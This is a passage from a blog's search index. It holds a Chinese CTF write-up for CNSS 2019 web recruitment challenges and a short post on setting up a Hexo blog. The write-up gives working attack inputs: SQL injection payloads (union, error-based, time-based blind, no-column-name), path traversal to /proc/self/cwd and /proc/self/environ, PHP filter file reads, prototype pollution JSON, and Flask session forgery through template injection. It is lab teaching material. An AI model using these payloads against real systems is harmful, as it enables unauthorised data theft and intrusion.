class="line">&#x2F;?key&#x3D;php:&#x2F;&#x2F;input&amp;f&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;s4cret.php</span><br></pre></td></tr></table></figure><p>然后 Burp Suite 抓包，请求方法改为 <code>POST</code>，请求体添加 zhi ma kai men!，获得一段 base64 编码的文本（或直接采用 HackBar 发送 POST 请求），解码后可看到一段神奇的注释，成功获得flag</p><h2 id="Gay-Profile-Plus"><a href="#Gay-Profile-Plus" class="headerlink" title="Gay Profile Plus"></a>Gay Profile Plus</h2><hr><p><del>继续 gay</del>看源码，继续 <code>/source</code>，发现加了一段神奇的语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> os.path.abspath(filename).startswith(os.getcwd()) <span class="keyword">and</span> filename != <span class="string">'./profile'</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'No No No'</span>, <span class="number">422</span></span><br></pre></td></tr></table></figure><p>这里大概意思是，如果要读取的文件在当前工作目录，那么它必须是 <code>./profile</code>，但是题目告诉我们 flag 在 <code>./flag</code> 中，显然直接读取就行不通了，由抓包可知服务器为 Linux，可考虑 <code>/proc</code> 文件系统</p><blockquote><p>proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和应用程序可以通过proc得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的。（源自网络）</p></blockquote><p>一般来说 <code>/proc</code> 目录下有以 PID 命名的目录，可以通过此目录获取进程所在目录的文件，但这里显然无法获取 PID，但源码中 <code>os.getcwd()</code> 提醒我们要用当前工作目录，于是构造以下 url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?name&#x3D;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag</span><br></pre></td></tr></table></figure><p>成功获得 flag</p><h2 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h2><hr><p>作为 sqli 的第一题，本题并不难，未进行任何过滤，但添加了 <code>code</code> 参数进行验证，防止了直接 SqlMap，但只需进行简单 union 查询注入即可，但应注意，此处仅显示查询的第一条结果，故查询时应给予一个无内容的 <code>id</code></p><p>依次查询库名、表名、字段名，直接查询即可，成功获得 flag</p><p>PS：可采用 Python 脚本自动输入 <code>code</code> 参数，缩短操作时间（另三道 sqli 同理）</p><h2 id="蟒蛇-Login-in"><a href="#蟒蛇-Login-in" class="headerlink" title="蟒蛇-Login_in"></a>蟒蛇-Login_in</h2><hr><p>打开发现一个登录界面，需要提供密码和验证码，且知道验证码MD5后的前三位，看源码，有以下注释</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--验证码一共4位数字字母，密码都是数字，验证码正确你就知道密码位数了--&gt;</span></span><br></pre></td></tr></table></figure><p>那就先写一个计算验证码的 python 脚本<br>得到正确的验证码并输入后，得知密码为4位数字，由于没有任何其他提示，这里选择爆破法，只需从 <code>0000</code> 试到 <code>9999</code> 即可，将上面的脚本进行扩充（由于验证码随机，注意使用 <code>session</code>，且注意 <code>requests</code> 获取网页的编码格式）<br>输入获取到的正确密码和验证码，成功获得 flag</p><h2 id="Gay-Profile-Plus-Plus"><a href="#Gay-Profile-Plus-Plus" class="headerlink" title="Gay Profile Plus Plus"></a>Gay Profile Plus Plus</h2><hr><p>既然题干已经说了放在文件不安全，那就不可能直接从本地文件获取 flag 了，那如何把一个东西存储在文件之外呢？这里我们继续考虑 gay+ 的时候用过的 <code>/proc</code> 文件系统，因为它存在于内存中，当然就不是文件了<br>查看 <code>/proc</code> 文件系统的具体说明，发现在进程目录下存在一个环境变量，猜测 flag 可能存在于此，故构造 url 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?name&#x3D;&#x2F;proc&#x2F;self&#x2F;environ</span><br></pre></td></tr></table></figure><p>发现 flag 果然在此，成功获得 flag</p><h2 id="产品经理"><a href="#产品经理" class="headerlink" title="产品经理"></a>产品经理</h2><hr><p>查看源码，在 <code>db.php</code> 的注释中发现以下 sql 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">name char(64)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">'cnss'</span>, sha256(....), <span class="string">'FLAG_HERE'</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>得知 <code>name</code> 的长度最大为 64 ， 而我们需要获取 <code>name</code> 为 <code>cnss</code> 处的 <code>description</code><br>因题干说了使用了 PDO ，首先排除sql注入</p><p>观察源码，发现 <code>get_product</code> 和 <code>check_name_secret</code> 分离</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function get_product($name) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $statement &#x3D; $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name, description FROM products WHERE name &#x3D; ?&quot;</span><br><span class="line">  );</span><br><span class="line">  ...&#125;</span><br><span class="line">function check_name_secret($name, $secret) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $valid &#x3D; false;</span><br><span class="line">  $statement &#x3D; $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name FROM products WHERE name &#x3D; ? AND secret &#x3D; ?&quot;</span><br><span class="line">  );</span><br><span class="line">  ...&#125;</span><br></pre></td></tr></table></figure><p>即验证 <code>name</code> 和 <code>secret</code> 和获取信息并非同步进行，而获取信息时并不需要 <code>secret</code>，考虑到 Mysql 对尾空格的处理，<code>add</code> 以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name: cnss + 任意空格</span><br><span class="line">Secret: 符合要求即可</span><br><span class="line">Description: 任意</span><br></pre></td></tr></table></figure><p>执行 <code>add</code> 操作后，<code>view</code> 以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: cnss</span><br><span class="line">Secret: 上一步设置的密码</span><br></pre></td></tr></table></figure><p>执行 <code>view</code> 操作，成功获得 flag</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><hr><p>经过试验，发现许多字符被屏蔽，比较重要的有（都有方法绕过或不使用）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and  -  *  空格</span><br></pre></td></tr></table></figure><p>其中 <code>空格</code> 可用 <code>%0a</code> 代替，注释符号 <code>--</code> 可用 <code>%23</code> 代替<br>由于 <code>and</code> 不可用，这里考虑报错注入，且由于 <code>*</code> 不可用，考虑 xml 的报错，经测试，xml 的报错注入可用，故构造如下 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27%0aor%0a(extractvalue(1,concat(0x7e,(......),0x7e)))%23</span><br></pre></td></tr></table></figure><p>只需将 <code>......</code> 处修改为查询语句，即可在报错中看到查询结果<br>依次查询库名、表名、字段名，成功获得 flag</p><h2 id="True-Love"><a href="#True-Love" class="headerlink" title="True_Love"></a>True_Love</h2><hr><p>不得不说，出题人真的有心了 <del>但是先别看这个心了看题吧</del><br>从第一个界面目测找不到什么有用信息，不妨打开题目所说的 <code>/admin</code> ，看到一个登陆界面，且第一行就说</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只有admin才能拿到flag</span><br></pre></td></tr></table></figure><p>那就让我们成为 admin 不就好了<br>查看 cookie 发现一条 session ， base64解码，发现第一段为用户名，考虑 session 伪造，而现在的问题在于不知道密钥，那就先拿到密钥<br>随便修改 <code>/</code> 后的内容，发现 <code>404</code> 界面中有出错的 url ，由于后端为 python ，尝试模板注入，先构造 <code>2</code> 得到结果 <code>2</code> ，模板构造漏洞存在，直接构造 <code></code> ，即可得到密钥<br>通过 flask 框架构造 session ，替换本题网页中的 session，刷新页面即可发现 flag 出现在 url 中，成功获得 flag</p><h2 id="normal-sql"><a href="#normal-sql" class="headerlink" title="normal_sql"></a>normal_sql</h2><hr><p>本题验证码变成了给定其md5的前四位，无非是增加了些脚本行数和运行时间，问题不大<br>依旧过滤了众多字符，且并无错误信息，故考虑延时盲注，构造如下 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;and(if(ascii(substr((select(...)from(...)),index,1))&gt;0,1,sleep(3)))%23</span><br></pre></td></tr></table></figure><p>修改 <code>...</code> <code>index</code> 和 <code>0</code> 处的值，通过网页加载时间，判断盲注结果<br>依次查询库名、表名、字段名，成功获得 flag</p><h2 id="Gay-Profile-Plus-Plus-Plus"><a href="#Gay-Profile-Plus-Plus-Plus" class="headerlink" title="Gay Profile Plus Plus Plus"></a>Gay Profile Plus Plus Plus</h2><hr><p>emmm…ts后端可还行<br>源码提供了那就直接康康，发现在 <code>/file</code> 中有以下内容</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file &amp;&amp; !ctx.__proto__.name) &#123;</span><br><span class="line">        ctx.body = <span class="string">'No No No...'</span>;</span><br><span class="line">        ctx.status = <span class="number">422</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file &amp;&amp; file.indexOf(<span class="string">'flag'</span>) !== <span class="number">-1</span>)&#123;</span><br><span class="line">        ctx.body = <span class="string">'No No No...'</span>;</span><br><span class="line">        ctx.status = <span class="number">403</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!file)&#123;</span><br><span class="line">        file = ctx.__proto__.name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>大概一看我们就会发现，flag 应该是放在一个文件中，而你不能通过这个文件名读取它，但是可以通过 <code>ctx.__proto__.name</code> 继承 <code>name</code> 属性，所以考虑原型链污染<br>再看 <code>/save</code> 的部分，可以发现输入数据会通过 <code>JSON.parse</code> 解析，这样就为我们进行原型链污染提供了可能，故构造以下 <code>JSON字符串</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>: <span class="string">"hhh"</span>, <span class="attr">"content"</span>: &#123;<span class="attr">"constructor"</span>: &#123;<span class="attr">"prototype"</span>: &#123;<span class="attr">"name"</span>: filename&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>只需修改 <code>filename</code> 的值提交，再在 <code>/file</code> 处将 <code>name</code> 留空，即可读取任意文件，首先尝试 <code>flag</code> 无果，再尝试 <code>../flag</code> ，成功获得 flag</p><h2 id="hard-sql"><a href="#hard-sql" class="headerlink" title="hard_sql"></a>hard_sql</h2><hr><p>题干直接告诉我们 <code>Make it wrong</code> ，首先考虑的是报错注入，但是错误信息根本没有回显，出错只会有 <code>Something wrong</code> 的提示<br>这里可以考虑让其在特定情况下报错，首先考虑 <code>if</code> ，发现被过滤，于是使用 <code>case when</code> 的用法<br>构造以下 payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and case (ascii(substr((something),index,1))) when asc then pow(999,999) <span class="keyword">end</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>这里注意 <code>select</code> 和 <code>information</code> 会被过滤，但只需通过大小写变化绕过即可<br>上述语句在查询的字符的 ascii 等于给出的数字时，才会执行 <code>pow(999,999)</code> ，此时才会产生报错<br>通过修改 <code>something</code> <code>index</code> 和 <code>asc</code> 可以爆出库名和表名，但当尝试爆出字段名的时候发现 <code>column</code> 被过滤且无法绕过，所以尝试无列名注入（虽然我也不懂为什么无列名注入的题只有一列，但是还是这么做了）,将 <code>something</code> 改为如下 payload 即可进行无列名注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="string">`1`</span> <span class="keyword">from</span> (<span class="keyword">Select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> database_name.table_name) <span class="keyword">as</span> a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>依次爆出 flag 的每一位即可，成功获得 flag</p><h2 id="BOSS-Get-Me-Inside"><a href="#BOSS-Get-Me-Inside" class="headerlink" title="[BOSS] Get Me Inside"></a>[BOSS] Get Me Inside</h2><hr><p><a href="/2019/10/24/cnss-recruit-2019-web-boss/">Get ♂ Me ♂ Inside</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNSS </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建血泪史</title>
      <link href="/2019/10/23/build-my-blog/"/>
      <url>/2019/10/23/build-my-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前几天心血来潮想搭个博客，可万万没想到，搭个博客如此令人愉(beng)悦(kui)，来让我们从头说起😭</p><h2 id="0x01-Where？"><a href="#0x01-Where？" class="headerlink" title="0x01 Where？"></a>0x01 Where？</h2><p>搭建博客一般有两种选择：GitHub Page 或者 自己的服务器(VPS)。第一种方法操作简单，而且<strong><em>不要钱</em></strong>，但只能使用静态网站，可以搭配 Hexo 等静态网站生成器，<del>但是由于一些特殊的原因，这里我采用了第二种方法</del> Github Page 真香（用了 Custom domain）。</p><p><del>VPS 服务商我选择了老牌大厂 Vultr ，一个一个试 IP 可是真的快♂乐（手动滑稽），经过无数次尝试，苍天不负有心人，终于给我个能用的了，然后 LNMP 一条龙，服务器方面基本 OK。</del></p><p>然后是域名，依旧是个老牌大厂 GoDaddy ，搞完域名随手挂在 CloudFlare 上，爽歪歪。</p><p>至此，第一个问题 “Where?” 解决。</p><h2 id="0x02-How？"><a href="#0x02-How？" class="headerlink" title="0x02 How？"></a>0x02 How？</h2><p>说起怎么建站，这可真的是<strong>血泪史</strong>的来历。</p><p>搭建博客一般又有两种选择：<strong>动态网站</strong> 和 <strong>静态网站</strong>。当然又由于对技术的向往（这次是真的向往），反手就是一个 Wordpress <del>（安装极其容易，轻松开始 Blog 生活）</del>。</p><p>好了装是装完了，嫌配置麻烦可能是因为我太菜了，<strong>但是</strong>，你官方主题还能再丑一点吗，你说好的博客平台你为啥主题千奇百怪（此处省略一万字吐槽），由于本人过菜不想自己配置太多只能靠吐槽为生，<del>大佬勿喷</del>反正也不会有大佬看的吧。好吧那既然官方主题满♂足不了我我就找第三方呗，<strong>但是</strong>，好康的是有啊，但是都要钱啊（此处留下贫穷的泪水）。好吧，潇洒转身，缓缓打出 <code>rm -rf ./*</code> ，拜拜了您嘞。</p><p>于是转向静态网站寻求解决，嗯，真香。说到静态网站就要提到这三家：Jekyll, Hugo 和 Hexo。这里我选择了配置简单，但并未改变我对技术的向往（手动狗头），且生成速度快的 <del>Hugo</del> （最终由于不明原因变成了 Hexo）。</p><p><del>配置方面嘛，打开 GitHub ，搜索 Hugo ，下载对应系统的 Release 版本，配置完成。这里不得不点名表扬一下 Hugo 的官方文档，真的是应有尽有了，然后再点名表扬一下官方收录的主题，</del>跟隔壁<del>算了面向的群体不同不说了。在我究极审美的指引下，我选择了这款偏向极简风格的 <code>Coder</code> 主题，自己看着舒服就好了。</del></p><p><del>从 GitHub 上 clone 一下主题，简单配置一下，就可以投入使用了。</del></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>至此，第二个问题 “How?” 也解决了。</p><h2 id="0x03-使用-HTTPS"><a href="#0x03-使用-HTTPS" class="headerlink" title="0x03 使用 HTTPS"></a>0x03 使用 HTTPS</h2><p>这里我使用了一个<strong>极其草率</strong>的方法，直接使用了 CloudFlare 的 <code>Flexible</code> 模式，然后再 <code>Page Rule</code> 里配置一下强制使用 HTTPS 即可。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>搭建博客并非一个简单的事，而同一种方法也不一定适合所有人，只有经过自己的尝试发现真正适合自己的方法，才能搭建出真正属于自己的博客。</p>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
